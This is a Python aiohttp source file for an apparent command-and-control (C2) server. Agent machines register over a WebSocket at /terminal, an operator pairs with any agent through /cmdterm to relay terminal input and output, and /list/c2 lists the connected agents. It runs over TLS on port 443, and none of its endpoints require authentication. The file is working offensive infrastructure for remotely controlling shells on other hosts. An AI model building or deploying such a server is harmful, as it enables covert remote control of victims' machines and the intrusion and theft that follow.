from aiohttp import web
from uuid import uuid4
import ssl,os

CERTIFICATE_DIR = os.path.join(os.path.dirname(__file__),'ssl_cert')

ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ssl_context.load_cert_chain(certfile=os.path.join(CERTIFICATE_DIR,'cert.pem'),keyfile=os.path.join(CERTIFICATE_DIR,'key.pem'))


routes = web.RouteTableDef()


app = web.Application()


@routes.get('/terminal')
async def Agent(req : web.Request):
    ws_res = web.WebSocketResponse()
    await ws_res.prepare(req)

    myUID = str(uuid4())
    myIdentity = req.headers.get('X-Identity','Unknown')
    ws_info = req.app['ws_info']

    try:
        ws_info['c2_ws'][myUID] = ws_res
        ws_info['c2_ws_info'][myUID] = myIdentity

        async for msg in ws_res:
            if msg.type == web.WSMsgType.BINARY:
                master : web.WebSocketResponse | None = ws_info['active_pair'].get(myUID,None)
                if master is not None and  master.closed == False:
                    await master.send_bytes(msg.data) #For Binary data
                    #await master.send_str(msg.data.decode('utf-8'))
            elif msg.type == web.WSMsgType.ERROR:
                break

            elif msg.type == web.WSMsgType.TEXT:
                master : web.WebSocketResponse | None = ws_info['active_pair'].get(myUID,None)
                if master is not None and  master.closed == False:
                    await master.send_str(msg.data)
    finally:
        del ws_info['c2_ws'][myUID]
        del ws_info['c2_ws_info'][myUID]
        await ws_res.close()
    
    return ws_res
    
        








@routes.get('/cmdterm')
async def Master(req : web.Request):
    ws_res = web.WebSocketResponse()
    await ws_res.prepare(req)

    ws_info = req.app['ws_info']
    agent_uid = req.query.get('uid','')
    agent_ws : web.WebSocketResponse | None= None

    if agent_uid in  ws_info['c2_ws'] and agent_uid not in ws_info['active_pair']:
        ws_info['active_pair'][agent_uid] = ws_res
        agent_ws = ws_info['c2_ws'][agent_uid]
    else:
        await ws_res.close(message=b'Agent is not found Or Agent is busy')
        return ws_res
    
    try:
        async for msg in ws_res:
            if msg.type == web.WSMsgType.BINARY:
                if not agent_ws.closed :
                    await agent_ws.send_bytes(msg.data)
                else:
                    #del ws_info['active_pair'][agent_uid]
                    await ws_res.send_bytes(b'Connection Lost With Agent')
                    break
            elif msg.type == web.WSMsgType.ERROR:
                break
            elif msg.type == web.WSMsgType.TEXT:
                if not agent_ws.closed :
                    await agent_ws.send_str(msg.data)
                else:
                    #del ws_info['active_pair'][agent_uid]
                    await ws_res.send_str('Connection Lost With Agent')
                    break
    finally:
        
        del ws_info['active_pair'][agent_uid]
        await ws_res.close()
    
    return ws_res







@routes.get('/list/c2')
async def ListAgent(req : web.Request):
    return web.json_response(req.app['ws_info']['c2_ws_info'])

async def Init(app : web.Application):
    app ['ws_info'] = {
        'c2_ws':  dict[str,web.WebSocketResponse](), # The agent should cleaup his own mess
        'c2_ws_info': dict[str,str](), # The agent should cleaup his own mess
        'active_pair': dict[str,web.WebSocketResponse]() # The Master should cleaup his own mess
    }

async def CleanWS(app : web.Application):
    ws_info = app ['ws_info']
    for _,v in list(ws_info['c2_ws'].items()):
        await v.close(message=b'Server Shutdown')
    
    for _,v in list(ws_info['active_pair'].items()):
        await v.close(message=b'Server Shutdown')


app.on_startup.append(Init)
app.on_shutdown.append(CleanWS)
app.add_routes(routes)



if __name__ == '__main__':
    web.run_app(app,port=443,ssl_context=ssl_context)